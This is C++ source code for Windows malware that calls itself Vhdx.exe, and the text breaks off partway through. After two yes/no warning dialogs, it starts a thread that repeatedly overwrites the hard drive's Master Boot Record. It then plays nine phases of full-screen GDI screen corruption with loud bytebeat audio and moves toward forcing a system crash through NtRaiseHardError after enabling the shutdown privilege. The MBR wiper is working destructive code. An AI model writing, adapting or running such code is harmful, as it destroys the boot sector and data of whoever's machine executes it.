#include <Windows.h>
#include <math.h>
#include <time.h>
#include "bootrec.h"


#pragma comment(lib, "winmm.lib")


HANDLE hActiveGdiThread = NULL;
typedef LONG(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef LONG(NTAPI* pfnNtRaiseHardError)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;

        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hDevice != INVALID_HANDLE_VALUE) {
            WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, NULL);
            CloseHandle(hDevice);
        }
        Sleep(10);
    }
}

void SoundPhase1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 11025 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {
        
        buffer[t] = static_cast<char>(t ^ 56 + t * 2 >> t);
    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>(t * -static_cast<int>(t >> 7 | t | t >> 5 | t >> 16) ^ t);

    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 40;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>(t * (t & t + (t >> 15 | 1) / (t - 1280 ^ t) >> 10));
    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 11025 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 128);

    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (1 + (3 & t >> 10)) >> (3 & t >> 8) | t >> 2);

    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>(t * t / (t >> 13 ^ t >> 8));

    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>(t * t / (t >> 13 ^ t >> 8));

    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
void SoundPhase8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 40;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {

        buffer[t] = static_cast<char>((t >> 6 | t << 3) + (t >> 5 | t << 3 | t >> 6) | t >> 2 | t << 1);


    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);

    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;
}
#include <windows.h>

void SoundPhase9() {
    HWAVEOUT hWaveOut = 0;
    
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 40; 
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < bufSize; ++t) {
        
        buffer[t] = static_cast<char>(
            (t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2)) | (t * (t >> 11 & 5) & t >> 7)
            );
    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    
    Sleep(30000);

    
    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}




void ClearScreen() {
    if (hActiveGdiThread != NULL) {
        TerminateThread(hActiveGdiThread, 0);
        CloseHandle(hActiveGdiThread);
        hActiveGdiThread = NULL;
    }
    InvalidateRect(NULL, NULL, TRUE);
    Sleep(1000);                      
}
struct HSL { float h, s, l; };

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        float r = rgb.rgbRed / 255.0f, g = rgb.rgbGreen / 255.0f, b = rgb.rgbBlue / 255.0f;
        float max_c = max(r, max(g, b)), min_c = min(r, min(g, b));
        float h = 0, s = 0, l = (max_c + min_c) / 2.0f;
        if (max_c != min_c) {
            float d = max_c - min_c;
            s = l > 0.5f ? d / (2.0f - max_c - min_c) : d / (max_c + min_c);
            if (max_c == r) h = (g - b) / d + (g < b ? 6 : 0);
            else if (max_c == g) h = (b - r) / d + 2;
            else if (max_c == b) h = (r - g) / d + 4;
            h /= 6.0f;
        }
        return { h, s, l };
    }

    BYTE hue2rgb(float p, float q, float t) {
        if (t < 0) t += 1; if (t > 1) t -= 1;
        if (t < 1.0f / 6.0f) return (BYTE)((p + (q - p) * 6.0f * t) * 255);
        if (t < 1.0f / 2.0f) return (BYTE)(q * 255);
        if (t < 2.0f / 3.0f) return (BYTE)((p + (q - p) * (2.0f / 3.0f - t) * 6.0f) * 255);
        return (BYTE)(p * 255);
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        if (hsl.s == 0) {
            BYTE c = (BYTE)(hsl.l * 255);
            return { c, c, c, 0 };
        }
        float q = hsl.l < 0.5f ? hsl.l * (1.0f + hsl.s) : hsl.l + hsl.s - hsl.l * hsl.s;
        float p = 2.0f * hsl.l - q;
        return { hue2rgb(p, q, hsl.h - 1.0f / 3.0f), hue2rgb(p, q, hsl.h), hue2rgb(p, q, hsl.h + 1.0f / 3.0f), 0 };
    }
}


DWORD WINAPI Effect_Plasma(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    int i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                float fx = (float)((x + i) ^ (y + i));

                RGBQUAD rgbquadCopy = rgbquad[index];
                HSL hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmodf(fx / 300.0f + (float)y / h * 0.1f, 1.0f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    DeleteObject(bmp); DeleteDC(hdcCopy);
    return 0;
}


void RunPhase1() {
    
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Plasma, NULL, 0, NULL);

    
    SoundPhase1();

  
    ClearScreen();
}
DWORD WINAPI Effect_Phase2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    int i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * log(x * y | i * x));

                RGBQUAD rgbquadCopy = rgbquad[index];
                HSL hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmodf(fx / 500.0f + (float)y / h * 0.1f, 1.0f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);

        int rectW = w / 2 + (rand() % 200 - 100);
        int rectH = h / 2 + (rand() % 200 - 100);
        RECT flashRect = { rand() % (w - rectW), rand() % (h - rectH), rand() % w, rand() % h };
        InvertRect(hdc, &flashRect);

        int textX = rand() % (w > 0 ? w : 1);
        int textY = rand() % (h > 0 ? h : 1);
        int fontSize = 20 + rand() % 40;
        HFONT hFont = CreateFontW(fontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Comic Sans MS");
        HFONT oldFont = (HFONT)SelectObject(hdc, hFont);
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
        SetBkMode(hdc, TRANSPARENT);

        if (rand() % 2 == 0) {
            TextOutW(hdc, textX, textY, L"Pangey1", 7);
        }
        else {
            TextOutW(hdc, textX, textY, L"Vhdx.exe", 8);
        }
        SelectObject(hdc, oldFont);
        DeleteObject(hFont);

        int iconX = rand() % w;
        int iconY = rand() % h;
        if (rand() % 2 == 0) {
            DrawIcon(hdc, iconX, iconY, LoadIcon(NULL, IDI_ERROR));
        }
        else {
            DrawIcon(hdc, iconX, iconY, LoadIcon(NULL, IDI_WARNING));
        }

        ReleaseDC(NULL, hdc);
        Sleep(30);
    }

    DeleteObject(bmp);
    DeleteDC(hdcCopy);
    return 0;
}

void RunPhase2() {
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Phase2, NULL, 0, NULL);
    SoundPhase2();
    ClearScreen();
}
DWORD WINAPI Effect_Spiral(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    float angle = 0.0f;
    float radius = 3.0f;
    float originX = w / 2.0f;
    float originY = h / 2.0f;
    int redrawCounter = 0;
    int lineY = 0;

    while (true) {
        HDC hdc = GetDC(NULL);
        if (hdc) {
            float angleRad = angle * 3.14159265f / 180.0f;
            int targetX = (int)(radius * cosf(angleRad) + originX);
            int targetY = (int)(radius * sinf(angleRad) + originY);

            BitBlt(hdc, 0, 0, w, h, hdc, targetX - (w / 2), targetY - (h / 2), SRCINVERT);

            HPEN hPen = CreatePen(PS_SOLID, 2 + rand() % 4, RGB(rand() % 256, rand() % 256, rand() % 256));
            HPEN oldPen = (HPEN)SelectObject(hdc, hPen);
            HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, GetStockObject(NULL_BRUSH));

            int rx1 = rand() % w, ry1 = rand() % h;
            int rx2 = rand() % w, ry2 = rand() % h;
            RoundRect(hdc, min(rx1, rx2), min(ry1, ry2), max(rx1, rx2), max(ry1, ry2), 15 + rand() % 30, 15 + rand() % 30);

            POINT p[4] = {
                { rand() % w, rand() % h },
                { rand() % w, rand() % h },
                { rand() % w, rand() % h },
                { rand() % w, rand() % h }
            };
            PolyBezier(hdc, p, 4);

            SelectObject(hdc, oldPen);
            SelectObject(hdc, oldBrush);
            DeleteObject(hPen);

            HBRUSH hLineBrush = CreateSolidBrush(RGB(255, 255, 255));
            RECT lineRect = { 0, lineY, w, lineY + 4 };
            FillRect(hdc, &lineRect, hLineBrush);
            InvertRect(hdc, &lineRect);
            DeleteObject(hLineBrush);

            lineY = (lineY + 15) % h;

            if (++redrawCounter >= 100) {
                InvalidateRect(NULL, NULL, TRUE);
                redrawCounter = 0;
            }
            ReleaseDC(NULL, hdc);
        }
        angle += 10.5f;
        if (angle >= 360.0f) angle = 0.0f;
        Sleep(5);
    }
    return 0;
}
void RunPhase3 () {
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Spiral, NULL, 0, NULL);
    SoundPhase3();
    ClearScreen();
}
DWORD WINAPI Effect_Phase4_ImpulseStretch(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    DWORD lastTriggerTime = GetTickCount();

    while (true) {
        DWORD currentTime = GetTickCount();

        if (currentTime - lastTriggerTime >= 4000) {
            HDC desk = GetDC(0);
            if (desk) {
                StretchBlt(desk, -20, -20, sw + 40, sh + 40, desk, 0, 0, sw, sh, SRCCOPY);
                ReleaseDC(0, desk);
            }

            Sleep(100);
            InvalidateRect(NULL, NULL, TRUE);

            lastTriggerTime = GetTickCount();
        }

        Sleep(10);
    }
    return 0;
}
void RunPhase4() {
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Phase4_ImpulseStretch, NULL, 0, NULL);
    SoundPhase4();
    ClearScreen();
}
DWORD WINAPI Effect_Phase5_Rotozoomer(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    int i = 0;
    double angle = 0.0;

    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);

        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = (int)(cos(angle) * cx - ceil(angle) * cy);
                int zy = (int)(ceil(angle) * cx + cos(angle) * cy);

                int fx = zx & zy;

                RGBQUAD rgbquadCopy = rgbquad[index];
                HSL hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmodf((float)fx / 300.0f + (float)y / h * 0.1f, 1.0f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        angle += 1.0;

        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }

    DeleteObject(bmp);
    DeleteDC(hdcCopy);
    return 0;
}
void RunPhase5() {
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Phase5_Rotozoomer, NULL, 0, NULL);
    SoundPhase5();
    ClearScreen();
}
DWORD WINAPI Effect_Phase6_PixelGlitch(LPVOID lpParam) {
    int startTime = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int totalBytes = w * h * 4; 

    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, totalBytes + 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (true) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);

        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, totalBytes, data);

        int v = 0;
        BYTE xorByte = 0;

        if ((GetTickCount() - startTime) > 60000) {
            xorByte = rand() % 0xFF;
        }

        BYTE* byteData = (BYTE*)data;

        for (int j = 0; (w * h) > j; j++) {
            if (j % h == 0 && rand() % 100 == 0) {
                v = rand() % 100;
            }

            
            int targetIdx = (4 * j + v);
            int sourceIdx = (4 * j - v);

            if (targetIdx >= 0 && targetIdx < totalBytes && sourceIdx >= 0 && sourceIdx < totalBytes) {
                byteData[targetIdx] = byteData[sourceIdx] ^ xorByte;
            }
        }

        SetBitmapBits(hbm, totalBytes, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);

        DeleteObject(hbm);
        DeleteDC(hdcdc);
        ReleaseDC(NULL, desk);

        Sleep(10);
    }

    VirtualFree(data, 0, MEM_RELEASE);
    return 0;
}
void RunPhase6() {
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Phase6_PixelGlitch, NULL, 0, NULL);
    SoundPhase6();
    ClearScreen();
}
DWORD WINAPI Cool_Effect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                FLOAT fx = (x - i) ^ (y - i);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}
void RunPhase7() {
    hActiveGdiThread = CreateThread(NULL, 0, Cool_Effect, NULL, 0, NULL);
    SoundPhase7();
    ClearScreen();
}
DWORD WINAPI Effect_Phase8_OldPlasma(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    int i = 0;

    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;
        int j = 4 * i; 

        for (int x = 0; x < w; x++) { 
            for (int y = 0; y < h; y++) { 
                int index = y * w + x;

                int fx = (int)(j + (j * sin(x / 16.0)) + j + (j * sin(y / 8.0)) + j + (j * sin((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;

                rgbquadCopy = rgbquad[index];

                HSL hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmodf(fx / 300.0f + (float)y / h * 0.1f, 1.0f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }

    DeleteObject(bmp);
    DeleteDC(hdcCopy);
    return 0;
}
void RunPhase8() {
    
    hActiveGdiThread = CreateThread(NULL, 0, Effect_Phase8_OldPlasma, NULL, 0, NULL);

    
    SoundPhase8();

    
    ClearScreen();
}
DWORD WINAPI Effect_Phase9_PixelGlitch(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int startTime = GetTickCount();

    while (1) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);

        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);

        int v = 0;
        BYTE xorByte = 0;

        if ((GetTickCount() - startTime) > 10000) { 
            xorByte = rand() % 0xFF;
        }

        for (int j = 0; w * h > j; j++) {
            if (j % h == 0 && rand() % 100 == 0) {
                v = rand() % 1000;
            }
            if (data != NULL) {
                *((BYTE*)data + 4 * j + v) = ((BYTE*)(data + j + v))[v] ^ xorByte;
            }
        }

        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);

        DeleteObject(hbm);
        DeleteDC(hdcdc);
        ReleaseDC(NULL, desk);
        Sleep(10);
    }

    VirtualFree(data, 0, MEM_RELEASE);
    return 0;
}


DWORD WINAPI Effect_Phase9_ZoomStretch(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);

    while (1) {
        HDC desk = GetDC(0);
        if (desk) {
            
            StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCCOPY);
            ReleaseDC(0, desk);
        }
        Sleep(15);
    }
    return 0;
}

DWORD WINAPI Effect_Phase9_TextOuts(LPVOID lpParam) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);

    const char* texts[] = {
        "Vhdx.exe",             
        "AMOGUS!!!",
        "Pangey1",              
        "Enjoy your new PC!!!",
        "THERE IS NO MERCY!!!",
        "IS THIS OHIO?!",
        "WHAT IS HAPPENING?!",
        "R.I.P PC!!!",
        "SYSTEM OVERLOADED!!!"
    };
    int totalTexts = sizeof(texts) / sizeof(texts[0]);

    while (1) {
        HDC hdc = GetDC(0);
        if (hdc) {
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));

            int index = rand() % totalTexts;
            TextOutA(hdc, rand() % (x + 1), rand() % (y + 1), texts[index], strlen(texts[index]));

            ReleaseDC(0, hdc);
        }
        Sleep(50);
    }
    return 0;
}
void RunPhase9() {

    hActiveGdiThread = CreateThread(NULL, 0, Effect_Phase9_PixelGlitch, NULL, 0, NULL);


    SoundPhase8();


    ClearScreen();
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    int response1 = MessageBoxW(
        NULL,
        L"This is a malware, Run?",
        L"Vhdx.exe",
        MB_YESNO | MB_ICONEXCLAMATION
    );

    if (response1 == IDNO) {
        ExitProcess(0);
    }

    int response2 = MessageBoxW(
        NULL,
        L"Are you sure?",
        L"!!!WARNING!!!",
        MB_YESNO | MB_ICONWARNING
    );
    if (response2 == IDNO) {
        ExitProcess(0);
    }

    
    CreateThread(NULL, 0, MBRWiper, NULL, 0, NULL);

    Sleep(2000);

    RunPhase1();

    Sleep(300);

    RunPhase2();
    Sleep(300);

    RunPhase3();
    Sleep(300);

    RunPhase4();
    Sleep(300);

    RunPhase5();
    Sleep(300);

    RunPhase6();
    Sleep(300);

    RunPhase7();
    Sleep(300);

    RunPhase8();
    Sleep(300);

   
    
    RunPhase9();

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) hNtdll = LoadLibraryA("ntdll.dll");

    pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");

    BOOLEAN bl;
    ULONG response;

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(19, 1, 0, &bl);
